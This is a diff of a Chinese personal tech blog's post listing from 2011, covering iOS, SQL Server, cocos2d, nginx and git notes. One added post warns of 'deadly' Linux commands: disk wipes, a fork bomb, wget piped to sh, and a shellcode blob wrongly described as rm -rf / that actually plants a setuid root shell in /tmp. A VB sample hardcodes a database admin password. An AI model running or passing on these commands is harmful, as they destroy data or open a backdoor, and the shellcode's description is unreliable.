@@ -7,7 +7,7 @@
 	<meta name="author" content="dawncold">
 
 	
-	<meta name="description" content="经过近1天的实践才摸清了这两个控件的搭配使用方法，网上介绍的不算多，我就把自己的经验说说： 首先这两个的搭配是这样的，基础是UITabBarController，你完全可以在Xcode中选一个以Tabbar为基础的工程，用Tabbar来划分程序的大功能，每个功能中再用Navigation来做导航 &hellip;">
+	<meta name="description" content="真不太想写，因为写这篇日志应该比写一个程序都要复杂。 我介绍的是box2d引擎在iphone上的使用方法，网上也有不少介绍的，我再简单啰嗦一番： 首先我们需要一个物理世界：b2world *world;在世界中创造各种各样的body，当然这些body都是刚体，如同经济学中的刚性需求那样， &hellip;">
 	
 	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
@@ -74,360 +74,6 @@
 		
 	
 	<div id="content" class="inner">
-
-
-    <article class="post">
-	<h2 class="title">
-		
-		<a href="/blog/2011/07/28/use-uinavigationcontroller-in-uitabbarcontroller/">
-		
-			UINavigationController和UITabBarController的搭配</a>
-	</h2>
-	<div class="entry-content">
-		<p>经过近1天的实践才摸清了这两个控件的搭配使用方法，网上介绍的不算多，我就把自己的经验说说：</p>
-
-<p>首先这两个的搭配是这样的，基础是UITabBarController，你完全可以在Xcode中选一个以Tabbar为基础的工程，用Tabbar来划分程序的大功能，每个功能中再用Navigation来做导航。我想大家应该都会这样做，当然如果反过来也不是不行，就是感觉有点别扭。</p>
-
-<p>在AppDelegate的初始化过程中用几个UINavigationController包裹UIViewController或者其子类（比如UITableViewController）放入UITabBarController中，这样的设置应该都会。我一开始这样写后，到了每个功能中，需要用到Navigation了，又自己写了一个UINavigationController，但不管用。然后我猜想是不是要自己模拟类似的功能，就自己加上了UINavigationBar，样子是对了，可惜这个bar不带popViewController的功能，完全让navigation成了摆设。无意中看到apple官方的例子中在UIViewController中用到了self.navigationController，我这才意识到UIViewController自己就带着UINavigationController。代码又改回以前的，几个UInavigationController包裹UIViewController初始化，然后在每个功能中大胆用self的navigationController来导航，达到了效果。</p>
-
-<p>还有，如果要做TableView，最好在UIViewController的子类中加入一个UITableView而不是UITableViewController，前者是一个控件，而后者是一套处理（当然还包括控件）。我一开始想在某个功能中用表格，加了一个表格的controller，总是看到表格开头多了一大块灰色的区域，硬生生地把一个表格给隔开了，具体问题在网上没有搜索到相关结果。但后来用了UITableView就好了。</p>
-
-<p>啰嗦了这么多，其实写的是我的探索过程，并不是直接给出的结果。</p>
-
-		
-		
-	</div>
-
-
-<div class="meta">
-	<div class="date">
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2011-07-28T06:01:00+08:00" pubdate data-updated="true">Jul 28<span>th</span>, 2011</time></div>
-	<div class="tags">
-
-
-	<a class='category' href='/blog/categories/uinavigationcontroller/'>UINavigationController</a>, <a class='category' href='/blog/categories/uitabbarcontroller/'>UITabBarController</a>, <a class='category' href='/blog/categories/uitableview/'>UITableView</a>, <a class='category' href='/blog/categories/uitableviewcontroller/'>UITableViewController</a>, <a class='category' href='/blog/categories/ji-zhu/'>技术</a>
-
-
-</div>
-	
-</div>
-</article>
-
-
-    <article class="post">
-	<h2 class="title">
-		
-		<a href="/blog/2011/07/26/iphone-simulator-and-sqlite/">
-		
-			Iphone模拟器和sqlite的问题</a>
-	</h2>
-	<div class="entry-content">
-		<p>最近和sqlite打交道比较频繁，感觉很别扭，可能是因为数据库的操作都在模拟器上测试的缘故吧，有几次查看数据库的内容总是没有结果，过一段时间就好了，我现在只能怀疑是模拟器搞的鬼。以后再弄数据库之前应该把模拟器中的程序删掉，重新传入数据。</p>
-
-<p>今天update进去信息，总是没发现数据库更新，怀疑是忘记commit，查看一下FMDB的使用方法，确实有commit一说，而我在看国内某博客写的使用教程时发现他就是随意的update和insert，殊不知这些都需要commit呀！在update和insert代码前后需要加入</p>
-
-<pre class="prettyprint linenums bush:cpp" lang="cpp">[db beginTransaction];
-和
-[db commit];</pre>
-
-
-<p> 我用的Objective-C。</p>
-
-<p>然而即便是这样，更新了数据库后再查询，确实数据被更改了，但我重新在模拟器中运行程序时候又恢复成了以前的值。偶然在模拟器中打开了程序而不是用xcode运行程序，数据竟然被永久更新了。</p>
-
-<p>所以，以后测试update的时候，前后对比应该只在模拟器中看，如果再用xcode启动，会把原来的数据传入模拟器，这样你就看不到效果了。</p>
-
-		
-		
-	</div>
-
-
-<div class="meta">
-	<div class="date">
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2011-07-26T09:19:00+08:00" pubdate data-updated="true">Jul 26<span>th</span>, 2011</time></div>
-	<div class="tags">
-
-
-	<a class='category' href='/blog/categories/iphone/'>iphone</a>, <a class='category' href='/blog/categories/sqlite/'>sqlite</a>, <a class='category' href='/blog/categories/ji-zhu/'>技术</a>
-
-
-</div>
-	
-</div>
-</article>
-
-
-    <article class="post">
-	<h2 class="title">
-		
-		<a href="/blog/2011/07/23/sadly-box2d-expreiences/">
-		
-			惨痛的Box2d经验</a>
-	</h2>
-	<div class="entry-content">
-		<p>说来也可笑，Box2d中有各种各样的Shape，有多边形，矩形，圆形。我就是在用圆形的时候遇到的这样的问题：需要设置圆形的半径，我就用了这样的表达式：26 / PTM_RADIO，后面的是一个宏定义，表示拿多少像素和box2d中的米作为兑换。我这样设置后总看着圆形很不正常，半径不对，而且落到底边也不弹起来，为此还查找了API、Google等地方，看着别人的代码都没问题，就是自己的不正常。</p>
-
-<p>最终还是解决了这样的问题，真羞愧，原来半径需要一个float的值，但我的表达式算出来的应该是int，不过我也曾经写过 float radius = 26 / PTM_RADIO这样的，再把radius给半径，依然无果，感觉即便是类型不对也应该自动转换过去吧，没想到这里还就是不行了。</p>
-
-<p>可恶的！</p>
-
-<pre class="prettyprint linenums bush:bash" lang="bash">26.0 / PTM_RADIO</pre>
-
-
-		
-		
-	</div>
-
-
-<div class="meta">
-	<div class="date">
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2011-07-23T11:30:00+08:00" pubdate data-updated="true">Jul 23<span>rd</span>, 2011</time></div>
-	<div class="tags">
-
-
-	<a class='category' href='/blog/categories/box2d/'>box2d</a>, <a class='category' href='/blog/categories/yuan-xing/'>圆形</a>, <a class='category' href='/blog/categories/ji-zhu/'>技术</a>
-
-
-</div>
-	
-</div>
-</article>
-
-
-    <article class="post">
-	<h2 class="title">
-		
-		<a href="/blog/2011/07/23/write-to-xiaoxian/">
-		
-			写给小娴</a>
-	</h2>
-	<div class="entry-content">
-		<p>小娴先生您好，不知道是不是每一位第一次读到您的作品的读者都会有一种想给您写信的冲动，但不知道该往哪个地方投递。</p>
-
-<p>以前初中、高中的时候似乎听过您的名字，那时仅仅指导您就是一位作家而已，那时候听过很多作家的名字了，有时还会买《读者》、《译林》、《特别关注》、《爱你》等书来看，可能那时候思想上特别寂寞吧，周围的人也都在看这些书。</p>
-
-<p>前一段时间在微博上看到您在推荐自己的新书——《想念》，看封面挺喜欢的，简洁，还有我喜欢的颜色，或许是那两个字吧。随后就在当当网买下来了。其实我还是喜欢在卓越网购买，只是当时卓越上似乎缺货了，要等一星期左右，而且商品图片都没有，一下子感觉卓越做了一回不专业的商家，就跑去当当了。</p>
-
-<p>几天就收到了书，但一直没看，连封皮都没有撕开，想，没有撕开的话，说不定还能送人，而且那时候正忙活考试，暂时找不到看这类书的闲情逸致，直到放假回家的车上才看起来。</p>
-
-<p>现在看了近200页，有得仔细读过，有得泛泛略过。从书中，渐渐地体会到了您的生活方式，而且您似乎正在享受着幸福的生活，至少在文章中看不出您对于生活有什么失望。当然也有可能不便流露吧。</p>
-
-<p>希望有机会您能看到。</p>
-
-		
-		
-	</div>
-
-
-<div class="meta">
-	<div class="date">
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2011-07-23T08:16:00+08:00" pubdate data-updated="true">Jul 23<span>rd</span>, 2011</time></div>
-	<div class="tags">
-
-
-	<a class='category' href='/blog/categories/xiao-xian/'>小娴</a>, <a class='category' href='/blog/categories/jing-zhi-desheng-huo/'>精致de生活</a>
-
-
-</div>
-	
-</div>
-</article>
-
-
-    <article class="post">
-	<h2 class="title">
-		
-		<a href="/blog/2011/07/22/lion-eat-my-file-on-desktop/">
-		
-			Lion吃了我的文件</a>
-	</h2>
-	<div class="entry-content">
-		<p>很奇怪的现象：我在桌面上放了一个文件，是用Bean生成的文本文件，接着从这个Desktop往下一个Desktop切换，但不完全切换，只需要看下一个Desktop内容的一点，然后再回到当前这个Desktop，就会发现桌面上的那个文件没了，但点击文件的位置仍然能够打开！！这应该是一个相当大的bug吧？难道还能是一个专门给用户着想的地方？！</p>
-
-		
-		
-	</div>
-
-
-<div class="meta">
-	<div class="date">
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2011-07-22T07:28:00+08:00" pubdate data-updated="true">Jul 22<span>nd</span>, 2011</time></div>
-	<div class="tags">
-
-
-	<a class='category' href='/blog/categories/desktop/'>desktop</a>, <a class='category' href='/blog/categories/file/'>file</a>, <a class='category' href='/blog/categories/lion/'>lion</a>, <a class='category' href='/blog/categories/ji-zhu/'>技术</a>
-
-
-</div>
-	
-</div>
-</article>
-
-
-    <article class="post">
-	<h2 class="title">
-		
-		<a href="/blog/2011/07/22/lion-eat-my-java/">
-		
-			Lion吃了我的Java</a>
-	</h2>
-	<div class="entry-content">
-		<p>刚刚看到cnbeta上一篇关于flash在lion中cpu占用率很高的问题，我感觉这都不算什么问题了，以前就发现占用率相当高，看flash视频的时候电脑会非常热。</p>
-
-<p>但这次说的不是这个问题，而是adobe提到的lion没有预置java，这点有些奇怪，难道lion安装上就把java删除了？我开了Terminal，输入:</p>
-
-<pre class="prettyprint linenums bush:bash" lang="bash">java -version</pre>
-
-
-<p>你猜显示什么？</p>
-
-<pre class="prettyprint linenums bush:bash" lang="bash">No Java runtime present, requesting install.</pre>
-
-
-<p>接着安装更新的那种小窗口就跳出来了，问我是否安装java，那就装上吧，我有时可能用eclipse。</p>
-
-<p>装好后就能用了，不知道还有什么东西被偷偷“吃掉”了。</p>
-
-<pre class="prettyprint linenums bush:bash" lang="bash">java version "1.6.0_26"
-Java(TM) SE Runtime Environment (build 1.6.0_26-b03-383-11A511)
-Java HotSpot(TM) 64-Bit Server VM (build 20.1-b02-383, mixed mode)</pre>
-
-
-		
-		
-	</div>
-
-
-<div class="meta">
-	<div class="date">
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2011-07-22T07:12:00+08:00" pubdate data-updated="true">Jul 22<span>nd</span>, 2011</time></div>
-	<div class="tags">
-
-
-	<a class='category' href='/blog/categories/java/'>java</a>, <a class='category' href='/blog/categories/lion/'>lion</a>, <a class='category' href='/blog/categories/ji-zhu/'>技术</a>
-
-
-</div>
-	
-</div>
-</article>
-
-
-    <article class="post">
-	<h2 class="title">
-		
-		<a href="/blog/2011/07/22/lion-eat-my-xcode-4-0/">
-		
-			Lion吃了我的Xcode</a>
-	</h2>
-	<div class="entry-content">
-		<p>昨天Lion在AppStore发布了，我也就是看了几眼。后来在论坛上有人说通过香港的免费升级服务有一小部分大陆的机器也得到了免费升级的机会，我也算是个港行的mbp，去试试看，结果我的机器似乎不在那个享受范围内。</p>
-
-<p>不过在微博上有人转发了一个Lion的种子，我就下载去了，一会儿竟然下载完了。然后晚上就装上了，apple在反盗版方面一点儿也不重视，下载是收费的，但你只要是得到了文件就随便使用。我这次也邪恶了一把。</p>
-
-<p>安装Lion好久了，先进行一个标明20min的预安装过程，再重启进行真正安装，那个过程标明33min但实际并不是这样，大约有3700s吧安装过程中鼠标移到最顶上，那个菜单条就出现了，可以看安装的log，比干等强一些。</p>
-
-<p>安装完Lion后我打开xcode，发现我的xcode4.0只能在10.6系统中运行，App Store中我还看到一个Xcode4.1而且是免费的，哎，这就很奇怪了，当初4.0是收费4.99美元下载的，现在又出来一个10.7系统下的免费4.1版本。既然免费就下载吧，但发现太慢。于是去了develop.apple.com上找develop tools在那里有xcode4.1的下载链接，本想用迅雷试试速度呢，不过igetter依然跳出来了，我也就没再换，速度还不错大约1MB/s左右，下载自动关机，就睡觉去了。</p>
-
-<p>早上安装了那个xcode4.1，安装完毕后发现再打开xcode还是提示只能在10.6系统下使用。难道安装没用？！又去develop目录下找找application，只有一个xcode的app图标，很奇怪不知道为何。</p>
-
-<p>打开看了一眼我的Application目录，发现里面有一个InstallXcode，打开试试，没想到这才是升级，打开后升级了现有的Xcode，终于能用了。我想可能刚刚安装的时候发现我已经安装了以前的版本，所以就出来一个升级过程吧。</p>
-
-		
-		
-	</div>
-
-
-<div class="meta">
-	<div class="date">
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2011-07-22T06:48:00+08:00" pubdate data-updated="true">Jul 22<span>nd</span>, 2011</time></div>
-	<div class="tags">
-
-
-	<a class='category' href='/blog/categories/lion/'>lion</a>, <a class='category' href='/blog/categories/xcode/'>xcode</a>, <a class='category' href='/blog/categories/ji-zhu/'>技术</a>
-
-
-</div>
-	
-</div>
-</article>
 
 
     <article class="post">
@@ -533,22 +179,48 @@ Java HotSpot(TM) 64-Bit Server VM (build 20.1-b02-383, mixed mode)</pre>
     <article class="post">
 	<h2 class="title">
 		
-		<a href="/blog/2011/07/16/who-will-see-my-micro-blog/">
+		<a href="/blog/2011/07/16/sql-server-is-so-bad/">
 		
-			微博是写给谁看的</a>
+			SQL SERVER真差劲！</a>
 	</h2>
 	<div class="entry-content">
-		<p>目前主要玩新浪微博，关注24人，粉丝175人，微博2007条。写了这么多微博，也算是一个中度的微博使用者了吧。现在微博这个工具确实很有趣，有的人拿来当成发布信息的高速途径；有的人专门做微博广告（我深深讨厌这些人，大约删除了400～500的广告粉丝了）；还有些人有意无意地写写、看看，仅仅当作消磨时间的工具。</p>
+		<p>并不想批评微软的产品，因为如果你用得习惯了，什么工具都不再是困难的。以前从没用过SQLSERVER，只是一直在用MySQL，用phpmyadmin管理起来也很方便。</p>
 
-<p>我深深感觉到，微博其实是写给“自己”看的。这里的“自己”应该不单指你这个读者，而含有一点深层的内涵。</p>
+<p>昨晚下载了SQL SERVER 2008 R2 Express，才64MB，又下载了对应的Management Studio，竟然需要270MB！后者安装很不容易，我的硬盘又很小，安装过程中由于失误的操作，复制了一个SQL实例出来，原本就一个叫SQLEXPRESS，现在多了一个MSSQLEXPRESS，本来就很小的空间又一次被减小了，而且还没装上Management！最后磁盘空间实在不够了，我关闭了win7的系统分页文件，一下子出来2.6GB，幸亏内存够大。</p>
 
-<p>一方面是因为它限制了字数，目前每条限制在140个字以内（似乎网易微博限制在163个字以内），这些都是跟着Twitter学来的，不过英文的140个字符能发一条短信，中文的话只有70个字呢，怎么国内不学学这个呢？发一条微博很快，能够记录自己短暂的灵感、对某个事物、现象的感受，而且很接近第一感受，我们不可能把自己对某个现象的第一感受写成一片论文那么长，大多数的第一感受也就是几个字，或者几个感叹词吧，这样的话，微博很合适。</p>
+<p>安装完毕后，两个实例都在运行，首先关闭一个。然后配置另一个的TCP/IP协议，这样才能正常连接。这里需要说明一下，在【SQL网络配额协议】中的【实例名下】的【TCP/IP】地址，最后一个是IPALL，写上TCP端口：1433，保存。重启实例的服务就能用management连接上了。</p>
 
-<p>另一方面，以我为例，我不喜欢在微博上关注很多人，目前的原则是最多关注42个人，超过42个人就删除已关注的人再关注新的，但就目前看来，达到42这个数字还有很长的路要走。（为何是42呢？那就搜搜42这个神奇的数字吧，有一个很梦幻的理由）我只喜欢维护一个小型的成熟的社交网络，而不是全面撒网。所以绝大多数微博是写给自己看的，很少得到好友们的评论，也许只有几个固定好友会看我写的，并且给我说两句，而我同样也会多多关注他们，这是一个相互的过程，你很容易就会去关心那些曾经关心过你的人。渐渐地，马太效应促使下，这个关系会日益紧密；同样，其他人的关系会渐渐瓦解。</p>
+<p>在vb中的一个测试代码：（数据库Test，dbo.Member表中有一行数据，tianzhen\tz_pwd）</p>
 
-<p>相反的方面，既然我说这是写给自己看的微博，那我反而不愿意看自己写出来的东西，这该怎么解释？不知道这是不是只针对我而言，我确实不大看自己写过的东西，偶尔看看写了多少条，决不会从头看自己写出来了什么。也许写微博是一个自己对事物评价的过程，有时候也是对自身的解读、发泄等等，自己在这个过程中已经得到了发展，渐渐会形成一种属于自己的成长过程，微博在此时便成为了一种表现这个过程的形式而已。我们自己并不太关心过程，甚至也不关心结果，可能是因为看不到结果是什么吧。</p>
+<p>最可恶的是我在设计表的时候用了nchar类型，长度用了10，如果字段内容不足10就会加空格补全。所以在vb中对于要和数据库中对比的时候必须把从数据库中得到的数据trim一下。</p>
 
-<p>写了这么多关于微博给自己看的理由，不能否认，别人在了解你的过程中也可能看你写过的微博，所以必然会有给他人看的成分，要不然就应该叫微日记了。（微日记这个点子不错吧？！）</p>
+<pre class="prettyprint linenums bush:vb" lang="vb">Imports System.Configuration
+Imports System.Data.SqlClient
+
+Public Class Form1
+
+   Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
+       Dim connStr As String = "Data Source = localhost; Initial Catalog = Test; user id = sa; password = tianzhen;"
+       Dim conn As SqlConnection = New SqlConnection(connStr)
+       Dim cmd As SqlCommand = New SqlCommand()
+       cmd.Connection = conn
+       cmd.CommandText = "SELECT password FROM dbo.Member WHERE username = 'tianzhen'"
+       Dim reader As SqlDataReader
+       conn.Open()
+       reader = cmd.ExecuteReader()
+       Dim login As Boolean = False
+       If reader.Read() Then
+           If TextBox1.Text = Trim(reader("password")) Then
+               MsgBox("login successfully!")
+           Else
+               MsgBox("login fail!!!")
+           End If
+       End If
+       conn.Close()
+   End Sub
+End Class
+</pre>
+
 
 		
 		
@@ -568,11 +240,542 @@ Java HotSpot(TM) 64-Bit Server VM (build 20.1-b02-383, mixed mode)</pre>
   
 
 
-<time datetime="2011-07-16T21:09:00+08:00" pubdate data-updated="true">Jul 16<span>th</span>, 2011</time></div>
+<time datetime="2011-07-16T06:13:00+08:00" pubdate data-updated="true">Jul 16<span>th</span>, 2011</time></div>
 	<div class="tags">
 
 
-	<a class='category' href='/blog/categories/zhe-si/'>哲思</a>, <a class='category' href='/blog/categories/wei-bo/'>微博</a>
+	<a class='category' href='/blog/categories/sqlserver/'>sqlserver</a>, <a class='category' href='/blog/categories/ji-zhu/'>技术</a>
+
+
+</div>
+	
+</div>
+</article>
+
+
+    <article class="post">
+	<h2 class="title">
+		
+		<a href="/blog/2011/07/15/install-cocos2d/">
+		
+			安装cocos2d 1.0</a>
+	</h2>
+	<div class="entry-content">
+		<p>前天cocos2d更新到了1.0版本，这个版本对于开源软件来说是一个里程碑，因为这应该是第一个能够称得上稳定的版本，当然也是新阶段的开始。</p>
+
+<p>安装还是很简单的，我已经安装上了xcode4.0和sdk4.3。</p>
+
+<p>要注意一点的就是安装的时候需要root权限，用sudo即可。</p>
+
+<pre class="prettyprint linenums bush:bash" lang="bash">dawncold@tianzhenmatoMacBook-Pro cocos2d-iphone-1.0.0$ sh ./install-templates.sh 
+cocos2d-iphone template installer
+
+Error: This script must be run as root in order to copy templates to /Library/Application Support/Developer/Shared/Xcode
+
+Try running it with 'sudo', or with '-u' to install it only you:
+  sudo ./install-templates.sh
+or:
+  ./install-templates.sh -u
+dawncold@tianzhenmatoMacBook-Pro cocos2d-iphone-1.0.0$ sudo sh ./install-templates.sh 
+Password:
+cocos2d-iphone template installer
+
+
+
+Installing Xcode 4 cocos2d iOS template
+----------------------------------------------------
+
+...creating destination directory: /Users/dawncold/Library/Developer/Xcode/Templates/cocos2d/
+...copying cocos2d files
+...copying cocoslive files
+...copying TouchJSON files
+...copying CocosDenshion files
+...copying CocosDenshionExtras files
+...copying FontLabel files
+...copying template files
+done!
+
+
+
+Installing Xcode 4 Chipmunk iOS template
+----------------------------------------------------
+
+...copying Chipmunk files
+done!
+
+
+
+Installing Xcode 4 Box2d iOS template
+----------------------------------------------------
+
+...copying Box2d files
+done!
+
+
+
+Installing Xcode 4 CCNode file templates...
+----------------------------------------------------
+
+...creating destination directory: /Users/dawncold/Library/Developer/Xcode/Templates/File Templates/cocos2d/
+done!
+...creating cocos2d template directory
+
+
+
+
+Installing Xcode 3 cocos2d iOS template
+----------------------------------------------------
+
+...creating destination directory: /Library/Application Support/Developer/Shared/Xcode/Project Templates/cocos2d 1.0.0/cocos2d Application/
+...copying template files
+...copying cocos2d files
+...copying cocos2d dependency files
+...copying CocosDenshion files
+...copying cocoslive files
+...copying cocoslive dependency files
+done!
+
+
+
+Installing Xcode 3 cocos2d iOS + box2d template
+----------------------------------------------------
+
+...creating destination directory: /Library/Application Support/Developer/Shared/Xcode/Project Templates/cocos2d 1.0.0/cocos2d Box2d Application/
+...copying template files
+...copying cocos2d files
+...copying cocos2d dependency files
+...copying CocosDenshion files
+...copying cocoslive files
+...copying cocoslive dependency files
+...copying Box2D files
+done!
+
+
+
+Installing Xcode 3 cocos2d iOS + chipmunk template
+----------------------------------------------------
+
+...creating destination directory: /Library/Application Support/Developer/Shared/Xcode/Project Templates/cocos2d 1.0.0/cocos2d Chipmunk Application/
+...copying template files
+...copying cocos2d files
+...copying cocos2d dependency files
+...copying CocosDenshion files
+...copying cocoslive files
+...copying cocoslive dependency files
+...copying Chipmunk files
+done!
+
+
+
+Installing Xcode 3 cocos2d Mac template
+----------------------------------------------------
+
+...creating destination directory: /Library/Application Support/Developer/Shared/Xcode/Project Templates/cocos2d 1.0.0/cocos2d Application - Mac/
+...copying template files
+...copying cocos2d files
+...copying CocosDenshion files
+done!
+...copying file templates
+...creating destination directory: /Library/Application Support/Developer/Shared/Xcode/File Templates/cocos2d 1.0.0/
+
+
+
+Installing Xcode 3 CCNode file templates...
+----------------------------------------------------
+
+done!
+</pre>
+
+
+		
+		
+	</div>
+
+
+<div class="meta">
+	<div class="date">
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2011-07-15T20:19:00+08:00" pubdate data-updated="true">Jul 15<span>th</span>, 2011</time></div>
+	<div class="tags">
+
+
+	<a class='category' href='/blog/categories/cocos2d/'>cocos2d</a>, <a class='category' href='/blog/categories/ji-zhu/'>技术</a>
+
+
+</div>
+	
+</div>
+</article>
+
+
+    <article class="post">
+	<h2 class="title">
+		
+		<a href="/blog/2011/07/14/vb-net-programming-problems/">
+		
+			VB.net考试上机题目汇总</a>
+	</h2>
+	<div class="entry-content">
+		<p>只是更新一下代码，因为在mac中的mono工作得不太好！！</p>
+
+<p>1.求两个数的最大公约数和最小公倍数：</p>
+
+<pre class="prettyprint linenums bush:vb" lang="vb">Module Module1
+
+   Public Function Gcd(ByVal num1 As Integer, ByVal num2 As Integer) As Integer
+       If num2 = 0 Then
+           Return num1
+       Else
+           Return Gcd(num2, num1 Mod num2)
+       End If
+   End Function
+
+   Public Sub Main()
+       Console.WriteLine("Input first num: ")
+       Dim num1 As Integer = Convert.ToInt32(Console.ReadLine())
+       Console.WriteLine("Input second num: ")
+       Dim num2 As Integer = Convert.ToInt32(Console.ReadLine())
+       Console.WriteLine("Gcd is :{0}", Gcd(num1, num2))
+       Console.WriteLine("Lcd is :{0}", (num1 * num2) / Gcd(num1, num2)) '两个数的积除以最大公约数就是最小公倍数
+       Console.ReadLine()
+   End Sub
+
+End Module
+</pre>
+
+
+
+
+
+		
+		<a href="/blog/2011/07/14/vb-net-programming-problems/" class="more-link">Read on &rarr;</a>
+	</div>
+
+
+<div class="meta">
+	<div class="date">
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2011-07-14T18:17:00+08:00" pubdate data-updated="true">Jul 14<span>th</span>, 2011</time></div>
+	<div class="tags">
+
+
+	<a class='category' href='/blog/categories/vb/'>vb</a>, <a class='category' href='/blog/categories/ji-zhu/'>技术</a>
+
+
+</div>
+	
+</div>
+</article>
+
+
+    <article class="post">
+	<h2 class="title">
+		
+		<a href="/blog/2011/07/12/7-deadly-command-on-linux/">
+		
+			看来的7条致命Linux命令</a>
+	</h2>
+	<div class="entry-content">
+		<pre class="prettyprint linenums bush:bash" lang="bash">1. rm -rf / 此命令将递归并强制删除 / 目录下的所有文件。
+2.
+
+char esp[] __attribute__ ((section(“.text”))) /* e.s.p
+release */
+= “\xeb\x3e\x5b\x31\xc0\x50\x54\x5a\x83\xec\x64\x68″
+“\xff\xff\xff\xff\x68\xdf\xd0\xdf\xd9\x68\x8d\x99″
+“\xdf\x81\x68\x8d\x92\xdf\xd2\x54\x5e\xf7\x16\xf7″
+“\x56\x04\xf7\x56\x08\xf7\x56\x0c\x83\xc4\x74\x56″
+“\x8d\x73\x08\x56\x53\x54\x59\xb0\x0b\xcd\x80\x31″
+“\xc0\x40\xeb\xf9\xe8\xbd\xff\xff\xff\x2f\x62\x69″
+“\x6e\x2f\x73\x68\x00\x2d\x63\x00″
+“cp -p /bin/sh /tmp/.beyond; chmod 4755
+/tmp/.beyond;”;
+
+这是 rm -rf / 的 hex（十六进制）版本，很能迷惑 Linux 用户。
+3. mkfs.ext3 /dev/sda 这将对硬盘进行重新格式化，自然，硬盘上的所有数据将灰飞烟灭。
+4. : ( ){  : |:&amp; };: 著名的 fork bomp，此命令将告诉你的系统执行海量的进程，直到你的系统僵死。
+5. any_command &gt; /dev/sda 使用该命令，原始数据将被写到块设备，其结果是造成数据丢失。
+6. wget http://some_untrusted_source -O- | sh 不要从不信任的地方下载东西，这可能会获取恶意代码。
+7. mv /home/yourhomedirectory/* /dev/null 此命令将移动主目录中的所有文件到一个不存在的地方，你将再也看不到那些文件。</pre>
+
+
+<p>我在Mac系统下试用了第四条奇怪的明令，没什么效果，看来Mac还稍微安全一点。其他的就不试了……</p>
+
+		
+		
+	</div>
+
+
+<div class="meta">
+	<div class="date">
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2011-07-12T18:11:00+08:00" pubdate data-updated="true">Jul 12<span>th</span>, 2011</time></div>
+	<div class="tags">
+
+
+	<a class='category' href='/blog/categories/an-quan/'>安全</a>, <a class='category' href='/blog/categories/ji-zhu/'>技术</a>
+
+
+</div>
+	
+</div>
+</article>
+
+
+    <article class="post">
+	<h2 class="title">
+		
+		<a href="/blog/2011/07/10/nginx-location-config/">
+		
+			Nginx下的location配置</a>
+	</h2>
+	<div class="entry-content">
+		<p>原来的location只是处理了“/”的情况，结果访问一个目录，即使此目录下有index.html也不会成功显示，于是改成了这样：</p>
+
+<pre class="prettyprint linenums bush:bash" lang="bash">location ~.*\.(php|php5)?$
+{
+    处理php
+}</pre>
+
+
+<p>这样之后，发现直接访问目录或者域名的时候不能正常显示了，必须跟上index.php这样的才可以。</p>
+
+<p>最终改成这样，解决了问题：</p>
+
+<pre class="prettyprint linenums bush:bash" lang="bash">location / {
+               root html;
+               index index.html index.php;
+}
+location ~.*\.(php|php5)?$ {
+处理php
+}</pre>
+
+
+		
+		
+	</div>
+
+
+<div class="meta">
+	<div class="date">
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2011-07-10T20:15:00+08:00" pubdate data-updated="true">Jul 10<span>th</span>, 2011</time></div>
+	<div class="tags">
+
+
+	<a class='category' href='/blog/categories/nginx/'>nginx</a>, <a class='category' href='/blog/categories/ji-zhu/'>技术</a>
+
+
+</div>
+	
+</div>
+</article>
+
+
+    <article class="post">
+	<h2 class="title">
+		
+		<a href="/blog/2011/07/10/git-export-function/">
+		
+			Git的导出功能</a>
+	</h2>
+	<div class="entry-content">
+		<p>用git管理项目的优势大家可能都看了许久了，我也是因为如此才用了git而不是svn、cvs这些。其实我是挺喜欢喜新厌旧的，因为新东西的出现并流行一定是比原来的有所突破，并且大多数人喜欢这种变革，所以为何不喜欢呢？</p>
+
+<p>用git管理项目不可避免要遇到导出功能，在svn和cvs上应该叫export功能，git上的这个功能似乎没找到，要这样做：先打包，再解压到一个地方去。还能接受吧。</p>
+
+<pre class="prettyprint linenums bush:bash" lang="bash">git-archive --prefix=map/ master | tar -x -C ../map_e/</pre>
+
+
+<p>稍微解释一下，prefix指明了用哪个仓库，后面的master应该就是branch的名称了，然后把这些传递给了tar，因为不指明&mdash;format的时候默认用了tar方式打包，所以这里传递给tar解压到上层目录的map_e中，当然实际工作可以解压到生产服务器上去。</p>
+
+		
+		
+	</div>
+
+
+<div class="meta">
+	<div class="date">
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2011-07-10T08:13:00+08:00" pubdate data-updated="true">Jul 10<span>th</span>, 2011</time></div>
+	<div class="tags">
+
+
+	<a class='category' href='/blog/categories/export/'>export</a>, <a class='category' href='/blog/categories/git/'>git</a>, <a class='category' href='/blog/categories/ji-zhu/'>技术</a>
+
+
+</div>
+	
+</div>
+</article>
+
+
+    <article class="post">
+	<h2 class="title">
+		
+		<a href="/blog/2011/07/09/best-content-in-include_path/">
+		
+			最好在include_path中加上根</a>
+	</h2>
+	<div class="entry-content">
+		<p>刚刚用了下typecho博客插件——友情链接来添加一个友情链接，但发现很多php文件找不到了，很奇怪，以前是可以的，看到warning中的信息，有个include_path的相关东西，看看里面提到的路径是不是有需要的文件，结果没有，而在其中路径的下一级目录下有，这就怪了。</p>
+
+<p>Google说最好把include_path写成&#8221;./&ldquo;。是不是这样就是自动便利所有的内容了？我猜是的！当前的include_path中又pear的路径，我就先不删除了，linux系统下用冒号分隔各个路径，在前面加上一个点即可。</p>
+
+<p>重启php，再次访问，恢复正常！</p>
+
+		
+		
+	</div>
+
+
+<div class="meta">
+	<div class="date">
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2011-07-09T16:54:00+08:00" pubdate data-updated="true">Jul 9<span>th</span>, 2011</time></div>
+	<div class="tags">
+
+
+	<a class='category' href='/blog/categories/php/'>php</a>, <a class='category' href='/blog/categories/ji-zhu/'>技术</a>
+
+
+</div>
+	
+</div>
+</article>
+
+
+    <article class="post">
+	<h2 class="title">
+		
+		<a href="/blog/2011/07/09/seek-and-tell-in-python/">
+		
+			简要写写python的file中的tell和seek</a>
+	</h2>
